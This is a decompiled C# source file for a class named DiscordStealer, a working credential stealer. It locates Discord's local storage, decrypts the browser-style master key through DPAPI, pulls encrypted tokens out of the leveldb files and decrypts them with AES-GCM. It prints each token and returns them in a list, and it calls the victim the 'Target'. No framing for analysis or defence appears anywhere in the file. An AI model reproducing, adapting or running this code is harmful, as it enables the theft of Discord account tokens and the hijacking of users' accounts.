using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.CSharp.RuntimeBinder;
using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace Modules
{
	// Token: 0x0200000F RID: 15
	public class DiscordStealer
	{
		// Token: 0x06000014 RID: 20 RVA: 0x00003060 File Offset: 0x00001260
		[global::System.Runtime.CompilerServices.NullableContext(1)]
		[return: global::System.Runtime.CompilerServices.Nullable(2)]
		public byte[] GetMasterKey(string A_1)
		{
			object obj = JsonConvert.DeserializeObject(File.ReadAllText(A_1 + "\\Local State"));
			if (DiscordStealer.<>o__0.<>p__2 == null)
			{
				DiscordStealer.<>o__0.<>p__2 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(DiscordStealer)));
			}
			Func<CallSite, object, string> target = DiscordStealer.<>o__0.<>p__2.Target;
			CallSite <>p__ = DiscordStealer.<>o__0.<>p__2;
			object obj2 = obj;
			object obj3;
			if (obj2 == null)
			{
				obj3 = null;
			}
			else
			{
				if (DiscordStealer.<>o__0.<>p__1 == null)
				{
					DiscordStealer.<>o__0.<>p__1 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "encrypted_key", typeof(DiscordStealer), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
				}
				Func<CallSite, object, object> target2 = DiscordStealer.<>o__0.<>p__1.Target;
				CallSite <>p__2 = DiscordStealer.<>o__0.<>p__1;
				if (DiscordStealer.<>o__0.<>p__0 == null)
				{
					DiscordStealer.<>o__0.<>p__0 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "os_crypt", typeof(DiscordStealer), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
				}
				obj3 = target2(<>p__2, DiscordStealer.<>o__0.<>p__0.Target(DiscordStealer.<>o__0.<>p__0, obj2));
			}
			return ProtectedData.Unprotect(RuntimeHelpers.GetSubArray<byte>(Convert.FromBase64String(target(<>p__, obj3)), Range.StartAt(5)), null, DataProtectionScope.CurrentUser);
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00003180 File Offset: 0x00001380
		[return: global::System.Runtime.CompilerServices.Nullable(new byte[] { 2, 1 })]
		public List<string> GetTokens()
		{
			List<string> list = new List<string>();
			Console.WriteLine("[+] Executing...");
			string text = "dQw4w9WgXcQ:";
			string text2 = "dQw4w9WgXcQ:[^\"]*";
			string environmentVariable = Environment.GetEnvironmentVariable("appdata");
			Console.WriteLine("[~] Appdata : " + environmentVariable);
			string text3 = environmentVariable + "\\discord";
			string text4 = text3 + "\\Local Storage\\leveldb\\";
			if (!Directory.Exists(text4))
			{
				Console.WriteLine("[+] Target Appears to not have discord..");
				return null;
			}
			Console.WriteLine("[+] Target has discord installed. Running Stealer..");
			byte[] masterKey = this.GetMasterKey(text3);
			Console.WriteLine("MASTERKEY : " + Encoding.ASCII.GetString(masterKey));
			foreach (string text5 in Directory.GetFiles(text4))
			{
				try
				{
					string text6 = text5;
					int num = text6.Length;
					int j = num - 3;
					string text7 = text6.Substring(j, num - j).ToLower();
					if (!(text7 != "ldb") || !(text7 != "log"))
					{
						string[] array = File.ReadAllText(text5).Split("\n", StringSplitOptions.None);
						for (j = 0; j < array.Length; j++)
						{
							foreach (object obj in Regex.Matches(array[j].Replace(" ", "").Trim(), text2))
							{
								string value = ((Match)obj).Value;
								num = text.Length;
								byte[] array2 = Convert.FromBase64String(value.Substring(num, value.Length - num));
								Encoding.ASCII.GetString(array2);
								GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
								AeadParameters aeadParameters = new AeadParameters(new KeyParameter(masterKey), 128, RuntimeHelpers.GetSubArray<byte>(array2, new Range(3, 15)), null);
								byte[] array3 = new byte[gcmBlockCipher.GetOutputSize(RuntimeHelpers.GetSubArray<byte>(array2, Range.StartAt(15)).Length)];
								gcmBlockCipher.Init(false, aeadParameters);
								gcmBlockCipher.ProcessBytes(RuntimeHelpers.GetSubArray<byte>(array2, Range.StartAt(15)), 0, RuntimeHelpers.GetSubArray<byte>(array2, Range.StartAt(15)).Length, array3, 0);
								Console.WriteLine("DECRYPTED TOKEN : " + Encoding.ASCII.GetString(array3));
								list.Add(Encoding.ASCII.GetString(array3));
							}
						}
					}
				}
				catch (Exception ex)
				{
					DefaultInterpolatedStringHandler defaultInterpolatedStringHandler = new DefaultInterpolatedStringHandler(27, 1);
					defaultInterpolatedStringHandler.AppendLiteral("[-] Exception Occured! [ ");
					defaultInterpolatedStringHandler.AppendFormatted<IDictionary>(ex.Data);
					defaultInterpolatedStringHandler.AppendLiteral(" ]");
					Console.WriteLine(defaultInterpolatedStringHandler.ToStringAndClear());
				}
			}
			return list;
		}
	}
}
